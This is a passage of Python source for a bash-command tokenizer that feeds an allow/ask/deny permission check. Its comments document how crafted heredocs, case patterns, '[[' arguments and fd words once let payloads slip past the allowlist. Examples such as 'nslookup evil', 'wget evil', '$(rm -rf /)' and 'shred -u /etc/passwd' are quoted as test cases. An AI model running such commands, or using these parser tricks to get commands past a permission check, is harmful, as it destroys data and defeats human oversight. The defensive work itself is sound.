        A heredoc body inside the substitution (`` `cat <<EOF ... EOF` ``) is
        skipped wholesale so a literal backtick in the body cannot prematurely
        close the substitution — the symmetric hazard to the apostrophe/quote
        leak handled in `_scan_paren_subst`.
        """
        i = start + 1
        n = len(command)
        heredoc_delim = None
        heredoc_seen_nl = False
        heredoc_strip = False  # `<<-`: the terminator line may be tab-indented

        def closes_heredoc(pos):
            """Index just past the terminator if the line at `pos` BEGINS with
            it, else None. `<<-` strips leading TABS — see
            `_parse_heredoc_delim`.

            A PREFIX match for the same reason as `_scan_paren_subst`'s: this
            finds the substitution's EXTENT, and bash's extent scanning is
            prefix-matched even though its heredoc reader is exact. The
            exact-line rule belongs to the top-level tokenizer's
            `closes_heredoc`, which is what actually decides where commands
            are. Task 32 §13.

            Under `<<-` the RAW line is tried before the tab-stripped one, the
            same union the other two copies use — see `_heredoc_line_starts`.
            """
            for k in BashCommandParser._heredoc_line_starts(
                    command, pos, heredoc_strip):
                if command[k:k+len(heredoc_delim)] == heredoc_delim:
                    return k + len(heredoc_delim)
            return None

        while i < n:
            c = command[i]
            if heredoc_delim is not None and heredoc_seen_nl:
                if c == '\n':
                    i += 1
                    end = closes_heredoc(i)
                    if end is not None:
                        i = end
                        heredoc_delim = None
                    continue
                i += 1
                continue
            if c == '\\' and i + 1 < n:
                i += 2
                continue
            if heredoc_delim is None and command[i:i+2] == '<<':
                # The refusal flag is for the TOKENIZER, which is the copy
                # that emits sub-commands; here it only matters where the
                # substitution ENDS, and a refused heredoc is not tracked
                # either way. The body still reaches the tokenizer through this
                # substitution's own CMD_SUBST token, which is where the
                # refusal gets reported.
                delim, j, heredoc_strip, _declined = \
                    self._parse_heredoc_delim(command, i)
                if delim is not None:
                    heredoc_delim = delim
                    heredoc_seen_nl = False
                    i = j
                    continue
            if c == '\n' and heredoc_delim is not None and not heredoc_seen_nl:
                heredoc_seen_nl = True
                i += 1
                # The FIRST body line is a candidate terminator too — see the
                # tokenizer's newline handler (task 32 round 5, item 3).
                end = closes_heredoc(i)
                if end is not None:
                    i = end
                    heredoc_delim = None
                continue
            if c == '`':
                i += 1
                break
            i += 1
        return command[start + 1:i - 1], i

    def _scan_arith(self, command: str, start: int,
                    _depth: int = 0) -> Tuple[int, List[Tuple[str, int]]]:
        """
        Scan an arithmetic expansion `$((...))` beginning at `start` (the `$`).

        Arithmetic runs no command, so its operands must NOT be validated as
        commands. Returns (end, nested) where `end` is the index just past the
        closing `))` (or end-of-string if unterminated) and `nested` is a list
        of (content, abs_offset) for command substitutions found INSIDE the
        arithmetic — those DO execute (`$(( $(cmd) + 1 ))`) and must still be
        surfaced. The literal span `command[start:end]` is left for the caller
        to keep glued to its token.
        """
        paren_depth = 0
        i = start + 1  # consume '$'; start counting at the first '('
        while i < len(command):
            c = command[i]
            if c == '\\' and i + 1 < len(command):
                i += 2  # skip escaped char
                continue
            if c == '(':
                paren_depth += 1
            elif c == ')':
                paren_depth -= 1
                if paren_depth == 0:
                    i += 1  # consume the final ')'
                    break
            i += 1
        interior_start = start + 3
        interior_end = i - 2 if paren_depth == 0 else i
        interior = command[interior_start:interior_end]
        nested = []
        if interior.strip():
            if _depth < self.MAX_SUBSTITUTION_DEPTH:
                for t_type, t_val, t_off in self._tokenize_with_quotes(
                        interior, _depth=_depth + 1):
                    if t_type == 'CMD_SUBST':
                        nested.append((t_val, interior_start + t_off))
            else:
                # The cap, reported rather than applied in silence. Arithmetic
                # is the one carrier whose nesting grows `_depth` inside the
                # TOKENIZER (`$((` * N re-enters _scan_arith without
                # parse_with_offsets ever recursing), so parse_with_offsets is
                # still at depth 0 and its own sentinel never fires. Forwarding
                # the sentinel as a nested CMD_SUBST makes it a sub-command by
                # the ordinary route. See MAX_SUBSTITUTION_DEPTH.
                nested.append((self.TRUNCATED_SUBSTITUTION_COMMAND,
                               interior_start))
        return i, nested

    def _tokenize_with_quotes(self, command: str,
                              _allow_conditional: bool = True,
                              _depth: int = 0) -> List[Tuple[str, str]]:
        """
        Tokenize command into (type, value) pairs

        `_allow_conditional` is internal (task 32): when False, a `[[` never
        opens a conditional and every operator stays a command separator. The
        pass sets it False for itself on retry when a `[[` turned out to be
        UNTERMINATED — see the end of this method.

        `_depth` is internal too: nesting depth through arithmetic and
        substitutions, capped at MAX_SUBSTITUTION_DEPTH. The retry passes it
        THROUGH unchanged — a retry is the same string at the same depth, not a
        level deeper.

        Token types:
        - ENV: Environment variable assignment (KEY=VALUE)
        - WORD: Regular word/argument
        - OP: Operator (|, &&, ||, ;)
        - REDIRECT: Redirection operator
        - QUOTED: Quoted string
        - HEREDOC_CONTENT: Content inside a heredoc (not parsed as commands)
        - CMD_SUBST: Command substitution $(...) or `...`
        - CASE_PATTERN: A `case` arm pattern (data, not a command; dropped)

        Args:
            command: Command string

        Returns:
            List of (type, value) tuples
        """
        tokens = []
        current = []
        current_start = 0  # Source offset where the current token buffer began
        in_quote = None  # None, "'", or '"'
        escaped = False
        i = 0

        # Heredoc handling
        heredoc_delimiter = None  # The delimiter we're looking for
        heredoc_seen_first_nl = False  # Track if we've passed first newline after <<
        heredoc_strip_tabs = False  # `<<-`: terminator line may be tab-indented

        # Command substitution handling
        cmd_subst_depth = 0  # Paren depth inside $(...)
        in_backtick = False  # Inside `...`

        # Conditional-expression handling. `[[` opens a bash conditional and `]]`
        # closes it; inside, `&&`/`||`/`|` are conditional connectors (not command
        # separators) and `<`/`>` are string comparisons (not redirections). So
        # while in_conditional we suppress operator/redirect detection and let
        # those characters fall through as ordinary word content, keeping the
        # whole `[[ ... ]]` as one sub-command. Command substitutions inside it
        # ARE still extracted (handled before the operator checks), so a
        # `[[ $(rm -rf /) ]]` still validates `rm -rf /` on its own.
        #
        # TASK 32: this suppression is entered ONLY for a `[[` at command
        # position, the way bash recognizes the reserved word. It used to fire
        # for ANY flushed token spelled `[[`, so an ordinary ARGUMENT spelled
        # `[[` (`echo [[ ; nslookup evil`) switched separator detection off for
        # the rest of the string and folded every following command into the
        # allowlisted head. `echo [[` is a plain word to bash and the `;` after
        # it still separates — measured under `set -T`.
        in_conditional = False

        # Case-statement handling. `case WORD in pat1|pat2) body ;; ... esac`
        # puts a PATTERN LIST where a command would otherwise be, and inside it
        # `|` alternates patterns while `)` closes the list — neither is a
        # command separator. Without this, `case "$f" in *docs*|*tmp*) continue;;`
        # splits into bogus sub-commands (`*docs*`, `*tmp*) continue`) that match
        # no allow pattern, forcing a prompt for a harmless script.
        #
        # case_stack holds one entry per open `case`, so nesting works. States:
        #   'case_word' — consumed `case`, awaiting its WORD operand
        #   'await_in'  — awaiting the `in` that opens the pattern list
        #   'pattern'   — inside a pattern list (data, not commands)
        #   'body'      — inside an arm body (normal commands) until `;;`
        # Pattern words are emitted as CASE_PATTERN and dropped when splitting;
        # a command substitution inside a pattern is still emitted separately
        # (bash does expand it) and so is still validated.
        case_stack = []
        case_paren_depth = 0  # extglob nesting inside the current pattern list

        # RESERVED-WORD POSITION — derived from the emitted token stream, never
        # tracked as a flag (task 32 round 3).
        #
        # Both consumers of this property (`case` pattern mode and the `[[`
        # conditional) suppress or drop text, so each must be reachable only
        # from a position where bash itself would read a RESERVED WORD. bash
        # recognizes one only as the first word of a command; a redirection, an
        # assignment prefix, an expansion or a preceding word all close that
        # window. Measured, every one of these is a syntax error or a
        # "command not found":
        #
        #     2>&1 if true; then :; fi      $(true) if true; then :; fi
        #     > /tmp/z if true; then :; fi  X=1 if true; then :; fi
        #     2>&1 [[ -f x ]]               <(true) [[ -f x ]]
        #     > /tmp/z [[ -f x ]]           X=1 [[ -f x ]]
        #     2>&1 case a in a) :;; esac    $(true) case a in a) :;; esac
        #     > /tmp/z if [[ -f x ]]        (`if` after a redirect TARGET is not
        #                                    reserved either — `if: command not
        #                                    found`)
        #
        # `reserved_word_position[k]` records whether the token at index k was
        # emitted at reserved-word position; `_at_reserved_word_position()` then
        # answers the same question for the token about to be emitted, as a
        # TOTAL function of the last token's TYPE:
        #
        #   (no tokens)            -> True   start of input
        #   OP                     -> True   a separator opens a command
        #   WORD in the keyword set-> whatever that keyword's own answer was
        #   WORD / ENV / REDIRECT /
        #   CMD_SUBST / CASE_PATTERN
        #                          -> False  the position is consumed
        #
        # Those five are exhaustive: they are every type this tokenizer ever
        # appends. Deriving the answer from the token stream — rather than from
        # a flag updated at each site that happens to remember — is what closes
        # the whole "advanced a word without flushing characters" class at once.
        # A flag maintained inside flush_current() below its `if not current`
        # early-out missed every construct that consumes a bash word while
        # leaving the buffer empty: a fused `2>&1`/`1>&2`, a redirect whose
        # target is the next token (`> [[ ; evil ]]`), a heredoc `<<`, an
        # fd-prefixed `3<>`, and every substitution the tokenizer lifts into a
        # token of its own (`$(…)`, `` `…` ``, `<(…)`, `>(…)`). Each of those
        # emits a REDIRECT or a CMD_SUBST, so each is now decisive on its own.
        # The rule itself is `_at_reserved_word_position`, a pure function of
        # the token list and this record, so it can be read — and asserted —
        # on its own rather than only through the tokenizer.
        reserved_word_position = {}

        # True when the character buffer is empty but the current WORD is not:
        # a glued `$(...)`/`` `...` ``/`<(...)` was lifted out into its own
        # token, and bash still counts it as word content. Used solely to decide
        # whether a `#` begins a comment (task 32): bash starts a comment only
        # at the START of a word, so `echo $(date)#x` is an argument, not a
        # comment, exactly as `echo ok#c` is. Every other mid-word position
        # leaves `current` non-empty and is covered by that instead.
        #
        # It is deliberately NOT consulted by _at_reserved_word_position(): every
        # site that sets it emits a CMD_SUBST immediately before doing so, and
        # CMD_SUBST already answers False there, so consulting both would be two
        # mechanisms for one rule. `test_word_open_paths_emit_a_substitution_token`
        # pins that implication rather than leaving it as a comment.
        word_open = False

        def flush_current():
            """Flush current token buffer"""
            nonlocal in_conditional, word_open
            # Cleared unconditionally: a flush ends the word whether or not any
            # characters were buffered for it (a lone `$(...)` word buffers none).
            word_open = False
            if not current:
                return
            token_str = ''.join(current)
            current.clear()

            # Read BEFORE this token is appended, so it describes this token's
            # own position. Nothing below may reorder past the append.
            at_cmd_start = self._at_reserved_word_position(
                tokens, reserved_word_position)
            reserved_word_position[len(tokens)] = at_cmd_start

            in_pattern = bool(case_stack) and case_stack[-1] == 'pattern'

            # Advance the case state machine BEFORE emitting, so the `in` that
            # opens a pattern list and the `esac` that closes the statement are
            # themselves still emitted as ordinary words.
            if case_stack and case_stack[-1] == 'case_word':
                case_stack[-1] = 'await_in'
            elif case_stack and case_stack[-1] == 'await_in':
                if token_str == 'in':
                    case_stack[-1] = 'pattern'
                else:
                    # Not the `case WORD in` shape after all — abandon it rather
                    # than start dropping tokens as patterns.
                    case_stack.pop()
            elif token_str == 'esac' and case_stack:
                case_stack.pop()
                in_pattern = False
            elif token_str == 'case' and at_cmd_start and not in_pattern:
                case_stack.append('case_word')

            if in_pattern:
                tokens.append(('CASE_PATTERN', token_str, current_start))
            else:
                tokens.append(self._classify_token(token_str, current_start))
                # `[[` / `]]` are recognized only as standalone tokens (bash
                # requires them space-separated), so toggling on the flushed
                # word is exact — a glued `a[[b` or `${arr[[i]]}` never matches.
                #
                # `[[` additionally has to be at RESERVED-WORD POSITION: bash
                # treats it as a reserved word only where a command may begin,
                # and as an ordinary argument anywhere else. Without the gate,
                # one `[[` argument suppressed every separator to end of string
                # (task 32 §1a).
                if token_str == '[[' and at_cmd_start and _allow_conditional:
                    in_conditional = True
                elif token_str == ']]':
                    in_conditional = False

        def closes_heredoc(pos):
            """Index just past the heredoc terminator if the line beginning at
            `pos` is it, else None.

            `<<-` strips leading TABS from the terminator line — that IS the
            operator's meaning. Round 4 taught the tokenizer to RECOGNIZE
            `<<-` without teaching it this, so the canonical indented block

                cat <<-EOF
                \thello
                \tEOF
                shred git status

            never found its terminator and swallowed the rest of the script:
            `allow ['cat']` where HEAD denied (task 32 round 5, item 2).

            The comparison is an EXACT-LINE match, as bash's is: after the
            optional `<<-` tab strip the delimiter must run to end-of-line or
            end-of-input. A PREFIX match is what round 5 shipped, on the
            argument that closing the body EARLY only surfaces body text as
            commands — "more sub-commands, never fewer". That argument is
            WRONG, and round 6 measured why (task 32 §13, blocker 2): the
            residual of the line that falsely closed the body is then tokenized,
            and it can reopen a SWALLOWING state — a fresh heredoc or an
            unterminated quote — which eats the real terminator and every
            command after it:

                cat <<EOF
                EOF cat <<Z
                EOF
                shred -u /etc/passwd

            Prefix-matching closes the body on `EOF cat <<Z`, the residual
            `cat <<Z` opens a heredoc whose delimiter `Z` never appears, and the
            payload is swallowed: `allow ['cat cat']` where HEAD (which never
            tested the first body line) denied. A 102-case fuzz over
            {3 delimiters} x {18 residuals} x {`<<`,`<<-`} found 24 such rows,
            and bash executed the payload in 24/24. So the prefix match DOES
            make the error it was documented as unable to make, and it makes it
            only in company with the first-body-line test below — the two round-5
            changes are correct only together.

            The two SCANNERS (`_scan_paren_subst`, `_scan_backtick`) keep the
            prefix match on purpose and are not a fourth copy that drifted:
            they find a substitution's EXTENT, which bash itself scans with a
            prefix-matched terminator even though its heredoc READER is exact.
            Both readings are measured; see `_scan_paren_subst.closes_heredoc`
            for the table and task 32 §13 for the cost of unifying them.

            Under `<<-` the RAW line is tried before the tab-stripped one —
            see `_heredoc_line_starts`.
            """
            for j in BashCommandParser._heredoc_line_starts(
                    command, pos, heredoc_strip_tabs):
                end = j + len(heredoc_delimiter)
                if (command[j:end] == heredoc_delimiter
                        and command[end:end + 1] in ('\n', '')):
                    return end
            return None

        def emit_separator(value, offset):
            """Append a command separator, which reopens reserved-word position
            — see _at_reserved_word_position(), which reads that off the OP
            token itself rather than off a flag set here."""
            tokens.append(('OP', value, offset))

        while i < len(command):
            # While the buffer is empty, keep the start offset pinned to the
            # current position; once we append a char it freezes until the next
            # flush, marking where this token began in the source.
            if not current:
                current_start = i
            char = command[i]

            # Handle heredoc mode (looking for delimiter)
            # Only activate heredoc mode after we've seen the first newline
            if heredoc_delimiter is not None and heredoc_seen_first_nl:
                # We're inside heredoc content, look for delimiter at start of line
                if char == '\n':
                    # End of line - check if next line starts with delimiter
                    i += 1
                    end = closes_heredoc(i)
                    if end is not None:
                        # Found the delimiter! Consume it, but leave the newline
                        # that follows so the newline handler can emit a command
                        # separator — otherwise a command after the heredoc (e.g.
                        # `cat <<EOF\n...\nEOF\necho done`) would merge into the
                        # heredoc command.
                        i = end
                        heredoc_delimiter = None
                        continue
                    # Not the delimiter, continue in heredoc mode
                    continue
                # Skip all heredoc content (don't tokenize it)
                i += 1
                continue

            # Handle escape (outside of single quotes)
            if escaped:
                current.append(char)
                escaped = False
                i += 1
                continue

            if char == '\\' and in_quote != "'":  # Backslash doesn't escape in single quotes
                # Check for line continuation (backslash followed by newline)
                if i + 1 < len(command) and command[i+1] == '\n':
                    # Line continuation - skip both the backslash and newline
                    i += 2
                    continue
                escaped = True
                current.append(char)
                i += 1
                continue

            # Handle quotes
            if char in ('"', "'"):
                if in_quote == char:
                    # Closing quote
                    current.append(char)
                    in_quote = None
                    i += 1
                    continue
                elif in_quote is None:
                    # Opening quote
                    in_quote = char
                    current.append(char)
                    i += 1
                    continue
                else:
                    # Different quote inside quoted string
                    current.append(char)
                    i += 1
                    continue

            # If in quote, add everything literally — with one exception:
            # inside DOUBLE quotes bash still performs command substitution. A
            # `$(...)` or `` `...` `` within "..." runs a command, and its own
            # quotes are balanced independently of the surrounding double quote
            # (so an inner `"` does NOT close the outer one). Without this, the
            # inner `"` flips our quote state and desyncs everything after it —
            # e.g. `git commit -m "$(cat <<'EOF' ... "quoted" ... EOF)"` splits
            # the commit body into bogus sub-commands. We extract the
            # substitution as a CMD_SUBST token (so the command it runs is
            # validated by the recursive pass) while keeping its literal text
            # glued to the current token, so the surrounding quoted word stays
            # intact. Single quotes suppress all expansion, so they fall through
            # to the literal append below.
            #
            # `$((...))` is arithmetic (runs no command) and must be checked
            # FIRST, since `$(` is a prefix of `$((`: without this an in-quote
            # `"sum=$((1+2))"` would mis-extract `1+2` as a bogus command.
            # Process substitution `<(...)`/`>(...)` is NOT performed inside
            # double quotes, so it is intentionally absent here.
            if in_quote == '"' and command[i:i+3] == '$((':
                arith_start = i
                end, nested = self._scan_arith(command, i, _depth)
                current.extend(command[arith_start:end])
                for content, off in nested:
                    tokens.append(('CMD_SUBST', content, off))
                i = end
                continue
            if in_quote == '"' and command[i:i+2] == '$(':
                subst_content, end = self._scan_paren_subst(command, i)
                tokens.append(('CMD_SUBST', subst_content, i))
                current.extend(command[i:end])
                i = end
                continue
            if in_quote == '"' and char == '`':
                subst_content, end = self._scan_backtick(command, i)
                tokens.append(('CMD_SUBST', subst_content, i))
                current.extend(command[i:end])
                i = end
                continue

            # If in quote, add everything literally
            if in_quote:
                current.append(char)
                i += 1
                continue

            # Handle arithmetic expansion $((...)). The arithmetic itself runs NO
            # command — it evaluates to a number — so its operands must NOT be
            # validated as commands. Without this, `$((pass+1))` is mistaken for a
            # command substitution and its inner text `pass+1` is checked as a
            # command, which matches no allow pattern and forces the whole
            # compound command to `ask`. bash distinguishes `$((` (arithmetic)
            # from a `$( (subshell) )` command substitution by the absence of a
            # space, so a glued `$((` is unambiguously arithmetic.
            #
            # BUT a command substitution nested inside the arithmetic DOES execute
            # (`$(( $(rm -rf /) + 1 ))` really runs `rm`), so we cannot swallow
            # the span blind. We keep the literal text glued to the current token
            # (so `pass=$((pass+1))` stays one assignment and `echo $((1+2))`
            # keeps its argument) and then re-tokenize the interior, surfacing any
            # nested $()/`` `` substitutions as CMD_SUBST tokens so the recursive
            # extractor still validates the commands they run.
            if command[i:i+3] == '$((' and cmd_subst_depth == 0 and not in_backtick:
                arith_start = i
                # Keep the literal text glued to the current token (so
                # `pass=$((pass+1))` stays one assignment and `echo $((1+2))`
                # keeps its argument); forward only the command substitutions
                # nested inside, with offsets mapped to absolute source
                # positions so the function-definition ordering logic holds.
                end, nested = self._scan_arith(command, i, _depth)
                current.extend(command[arith_start:end])
                for content, off in nested:
                    tokens.append(('CMD_SUBST', content, off))
                i = end
                continue

            # Handle process substitution <( ... ) and >( ... ). The inner
            # command runs in a subshell with its stdout/stdin wired to a
            # /dev/fd path, so it DOES execute and must be extracted and
            # validated on its own — exactly like $(...). Without this the
            # leading `<`/`>` is tokenized as a redirect and the inner command's
            # text leaks into the surrounding sub-command, hiding it: e.g.
            # `read x < <(wget evil)` would otherwise collapse to a harmless
            # `read` and auto-allow. The `<`/`>` is matched glued to `(` (bash
            # requires no space), which disambiguates it from a plain `< file`
            # redirect or a `(subshell)`. We emit the interior as a CMD_SUBST
            # token (the recursive extractor parses it) and drop it from the
            # surrounding command; the preceding redirect operator, if any, was
            # already tokenized separately and its now-empty target is harmless.
            if command[i:i+2] in ('<(', '>(') and cmd_subst_depth == 0 and not in_backtick:
                flush_current()
                cmd_subst_depth = 1
                i += 2  # skip the `<`/`>` and the opening `(`
                subst_start = i
                # Track quote state so a `)` inside a quoted string (e.g. a regex
                # `[^)]`) does not prematurely close the substitution — same
                # hazard as the `$(...)` scanner above.
                subst_quote = None  # None, "'", or '"'
                while i < len(command) and cmd_subst_depth > 0:
                    c = command[i]
                    if c == '\\' and subst_quote != "'" and i + 1 < len(command):
                        i += 2  # skip escaped char
                        continue
                    if subst_quote:
                        if c == subst_quote:
                            subst_quote = None
                        i += 1
                        continue
                    if c in ('"', "'"):
                        subst_quote = c
                        i += 1
                        continue
                    if c == '(':
                        cmd_subst_depth += 1
                    elif c == ')':
                        cmd_subst_depth -= 1
                    i += 1
                # Interior excludes the opening `(` (already skipped) and the
                # closing `)` (i now points just past it).
                subst_content = command[subst_start:i-1]
                tokens.append(('CMD_SUBST', subst_content, subst_start))
                # The `/dev/fd/N` this expands to is word content: a `#` glued
                # after it is not a comment.
                word_open = True
                continue

            # Handle command substitution $(
            if command[i:i+2] == '$(' and cmd_subst_depth == 0:
                current_str = ''.join(current)
                env_prefix = self._is_env_prefix(current_str)

                if not env_prefix:
                    flush_current()

                subst_start = i
                subst_content, end = self._scan_paren_subst(command, i)
                tokens.append(('CMD_SUBST', subst_content, subst_start))

                if env_prefix:
                    # Part of env var value — keep the literal `$(...)` in the
                    # current token.
                    current.extend(command[subst_start:end])

                # What the substitution expands to is word content, so a `#`
                # glued right after it continues the word rather than opening a
                # comment (`echo $(date)#x`).
                word_open = True
                i = end
                continue

            # Handle backtick command substitution
            if char == '`' and not in_backtick and cmd_subst_depth == 0:
                current_str = ''.join(current)
                env_prefix = self._is_env_prefix(current_str)

                if not env_prefix:
                    flush_current()

                subst_start = i
                subst_content, end = self._scan_backtick(command, i)
                tokens.append(('CMD_SUBST', subst_content, subst_start))

                if env_prefix:
                    # Part of env var value — keep the literal `` `...` `` in
                    # the current token.
                    current.extend(command[subst_start:end])

                # Word content, like the `$(...)` case above.
                word_open = True
                i = end
                continue

            # If inside command substitution, treat most chars literally
            if cmd_subst_depth > 0 or in_backtick:
                current.append(char)
                i += 1
                continue

            # A heredoc operator: `<<`, or its tab-stripping spelling `<<-`.
            # Suppressed inside `[[ ]]`, where `<` is a string comparison, not
            # a redirection.
            #
            # `<<<` is the HERE-STRING — a different operator, with a word
            # operand and no body — and `_parse_heredoc_delim` rejects it, so
            # the operator scan below emits it. The branch is still ENTERED for
            # it, and that is deliberate: the `flush_current()` here is
            # load-bearing. `<` is a bash METACHARACTER, so it ends the word
            # before it. Round 4 guarded the whole branch with
            # `command[i:i+3] != '<<<'` and called the guard unobservable; in
            # `case` PATTERN mode, where the operator scan below is suppressed,
            # nothing else ends the word, so `case a in esac<<<x ; shred …`
            # buffered `esac<<<x`, the `case` never closed, and every separator
            # to end of string was swallowed — allow, where HEAD denied and
            # bash runs `shred` (task 32 round 5, item 4). The guard was a live
            # bypass, not an unobservable branch.
            if command[i:i+2] == '<<' and not in_conditional:
                flush_current()
                delimiter, j, strip_tabs, declined = \
                    self._parse_heredoc_delim(command, i)
                if delimiter is not None:
                    heredoc_delimiter = delimiter
                    heredoc_strip_tabs = strip_tabs
                    heredoc_seen_first_nl = False  # Will look for delimiter after first newline
                    tokens.append(('REDIRECT', '<<', i))
                    # Skip to after the delimiter (and closing quote if any)
                    i = j
                    continue
                if declined:
                    # A heredoc bash DOES open, whose delimiter we decline to
                    # compute (`<<$(…)`, ``<<`…` ``, `<<$'…'`, `<<$"…"`).
                    #
                    # Refusing is not the end of it. The body is handed back to
                    # this same loop as ordinary text, and a first body line
                    # that opens another SWALLOWING construct — `cat <<Z`,
                    # `echo 'x` — eats the real terminator and the payload with
                    # it, leaving a split that is entirely allowlisted:
                    #
                    #   cat <<E$'x'F / cat <<Z / ExF / shred -u /etc/passwd
                    #     HEAD   -> deny   ['cat xF', 'shred -u /etc/passwd']
                    #     round 8-> allow  ["cat E$'x'F", 'cat']
                    #     bash   -> runs cat, then shred
                    #
                    # So the refusal is REPORTED, exactly as the depth cap's is
                    # (see MAX_SUBSTITUTION_DEPTH): an unmatchable sub-command
                    # that no `Bash(<binary>:*)` pattern can match, carried
                    # as a CMD_SUBST token so `parse_with_offsets` makes it a
                    # sub-command by the ordinary route. That makes "a refused
                    # heredoc can never reach `allow`" true BY CONSTRUCTION —
                    # the property round 8 only had by accident of which
                    # residuals its corpus happened to contain. The cost is a
                    # prompt where HEAD sometimes managed a `deny`; `ask`
                    # is the safe direction and `allow` is not. Task 32 §16.
                    #
                    # The token is emitted BEFORE falling through to the
                    # operator scan, which lexes the `<<` as an ordinary
                    # redirection — deliberately: both answer False to
                    # `_at_reserved_word_position`, so the position this branch
                    # leaves behind is the one round 8 left, and only the extra
                    # sub-command is new.
                    tokens.append(('CMD_SUBST',
                                   self.TRUNCATED_SUBSTITUTION_COMMAND, i))

            # File-descriptor prefix on a redirection: a digit run glued with
            # no space to a redirect operator (`2>`, `3<>`, `4>>`) names the fd
            # bash should redirect. Only fires at a token boundary (nothing
            # buffered) so `foo3>bar` keeps `foo3` as a word, matching bash. The
            # fd number is irrelevant for allowlisting, so we drop it and emit
            # the bare operator — which also stops the digit from leaking out as
            # a phantom command word (the bug that mis-parsed `exec 3<>/dev/...`
            # into a `3 /dev/... 2` non-command).
            #
            # Skipped when the digit already begins a recognized FUSED operator
            # (`2>&1`, `1>&2`): the normal operator check below handles those
            # whole — the precondition `not _check_operator(command, i)` is what
            # excludes them, and it is the ONLY exclusion left.
            #
            # The fd-dup forms (`n>&m`, `n<&m`, `n>&-`) used to be excluded too,
            # which is what leaked the fd word into the command: `2>&- printf
            # ok` reported the head as `2`, and at COMMAND-START position that
            # hides the command entirely — `printf A ; 3<&1 __t32_tail__` was
            # reported as `3 __t32_tail__` (task 32 round 5, item 6). bash runs
            # `printf ok` for the first and `__t32_tail__` for the second, so
            # dropping the fd word is the FAITHFUL reading, and it is the same
            # reading this branch already gave `3>`, `3<>` and `1>&`.
            # The heredoc forms are handled by their own branch just above.
            #
            # This branch is what makes `1>`, `1>>`, `1>|` and `1>&` work now
            # that `1>` is no longer matched whole (task 32 round 4): bash
            # lexes NUMBER then operator, and so does this.
            # The fd word is a digit run (bash's NUMBER) or a `{name}` varname
            # (bash's REDIR_WORD, which stores the allocated fd in `$name`).
            # `{name}` counts ONLY when a redirect operator follows it with no
            # space — that is bash's own rule, and it is what keeps `echo {v}`
            # and the brace expansion `echo {a,b}` ordinary words. Measured:
            # `echo hi {v}> f` prints `hi`, not `hi {v}`, so dropping the fd
            # word is faithful; leaking it made `{v}>| f printf ok` report the
            # head as `{v}` (task 32 round 4, the same leading-fd-word leak the
            # `2>&-` known_gap records).
            fd_word_end = i
            if not current and not word_open and not in_conditional:
                if char.isdigit():
                    while (fd_word_end < len(command)
                           and command[fd_word_end].isdigit()):
                        fd_word_end += 1
                else:
                    match = self._FD_VARNAME_RE.match(command, i)
                    if match:
                        fd_word_end = match.end()
            if (fd_word_end > i and not self._check_operator(command, i)):
                j = fd_word_end
                # bash lets an fd word precede only an operator that STARTS
                # with `<` or `>` (its grammar spells every `NUMBER redirection`
                # rule that way). `&>` and `&>>` are not among them: in
                # `printf A 2&> f` the `2` is an ordinary ARGUMENT, and
                # swallowing it as an fd would drop a word the command really
                # receives. Testing the source character rather than the
                # returned token keeps this correct through the `>&` -> `&>`
                # normalization, which rewrites the token but not the source.
                fd_op = (self._check_operator(command, j)
                         if j < len(command) and command[j] in ('<', '>')
                         else '')
                if fd_op in ('<<', '<<-'):
                    # `n<<DELIM` / `{v}<<-DELIM`: the heredoc branch above
                    # consumes the delimiter for itself, so there is no operand
                    # token to skip — but the fd word must still be DROPPED.
                    # Left in the stream it became the sub-command HEAD:
                    # `printf A ; 3<<1 __t32_tail__` was reported as
                    # `3 __t32_tail__`, hiding the command bash really runs.
                    #
                    # Only the COMMAND-START sweep can see this; in argument
                    # position (`printf A 3<<1 __t32_tail__`) the tail is an
                    # argument and bash never runs it, which is exactly why
                    # four rounds of an argument-position-only sweep reported 0
                    # (task 32 round 5, item 6).
                    i = j
                    continue
                if fd_op and self._is_redirect(fd_op):
                    tokens.append(('REDIRECT', fd_op, i))
                    i = j + len(fd_op)
                    continue

            in_case_pattern = bool(case_stack) and case_stack[-1] == 'pattern'

            # Inside a `case` pattern list, `)` closes the list and hands control
            # back to normal command parsing. A `(` that STARTS a pattern word is
            # the optional list-opener bash allows (`(a|b) cmd;;`) and is dropped;
            # a `(` glued inside a word opens an extglob (`@(a|b)`) whose own `)`
            # must not be mistaken for the closer, so track its depth.
            if in_case_pattern and char == '(':
                if not current and case_paren_depth == 0:
                    i += 1  # optional `(` before the pattern list
                    continue
                case_paren_depth += 1
                current.append(char)
                i += 1
                continue
            if in_case_pattern and char == ')':
                if case_paren_depth > 0:
                    case_paren_depth -= 1
                    current.append(char)
                    i += 1
                    continue
                flush_current()
                case_paren_depth = 0
                # `flush_current` runs the case state machine, and its `esac`
                # rule POPS the statement. `( case a in a) x ;; esac)` reaches
                # this `)` with `esac` buffered: the flush closes the statement
                # and the stack is empty, so there is no arm to open — this `)`
                # closes the enclosing GROUP. Assigning `case_stack[-1]` blind
                # raised IndexError, and main()'s blanket `except Exception:
                # sys.exit(0)` turned that into NO DECISION: a real `deny` was
                # lost on valid, idiomatic bash (task 32 round 4, BLOCKER 3).
                # Fall through instead and let `)` be an ordinary character,
                # which is how the tokenizer treats a grouping paren elsewhere.
                if case_stack:
                    case_stack[-1] = 'body'
                    # The arm body is a new command; without a separator here
                    # it would merge into the `case ... in` header token group.
                    emit_separator(';', i)
                    i += 1
                    continue
                in_case_pattern = False
                # The buffer was just flushed, so re-pin the token start: we
                # are falling through mid-iteration, past the top-of-loop
                # `if not current: current_start = i`.
                current_start = i

            # An `esac` glued to an arm terminator (`... ;; esac;; ...`) closes an
            # INNER case, and the terminator then belongs to the ENCLOSING arm.
            # Operator detection is suppressed in pattern mode, so without this
            # the buffer would grow to `esac;;`, the state machine would never
            # see a bare `esac`, and the inner case would stay open — swallowing
            # the outer statement's remaining arms as pattern text. Flush it here
            # so the pop happens, then re-read the `;` in the popped state.
            if in_case_pattern and char == ';' and ''.join(current) == 'esac':
                flush_current()
                continue

            # `;;` ends a case arm and returns to pattern parsing, so the NEXT
            # arm's pattern list is read as data rather than as commands. The
            # bash fallthrough forms `;&` and `;;&` terminate an arm too.
            if case_stack and case_stack[-1] == 'body' and char == ';':
                term = next((t for t in (';;&', ';;', ';&')
                             if command[i:i+len(t)] == t), None)
                if term:
                    flush_current()
                    emit_separator(';', i)
                    # Same underflow as the pattern-`)` branch above: the flush
                    # runs the case state machine, and a buffered `esac`
                    # (`case a in b) esac;; esac`) pops the statement, leaving
                    # nothing to return to pattern mode. The `;;` is then just
                    # a separator, which is what was already emitted.
                    if case_stack:
                        case_stack[-1] = 'pattern'
                    case_paren_depth = 0
                    i += len(term)
                    continue

            # Check for operators (only when not quoted). Inside a `[[ ]]`
            # conditional, &&/||/|/<>/ are expression operators, not command
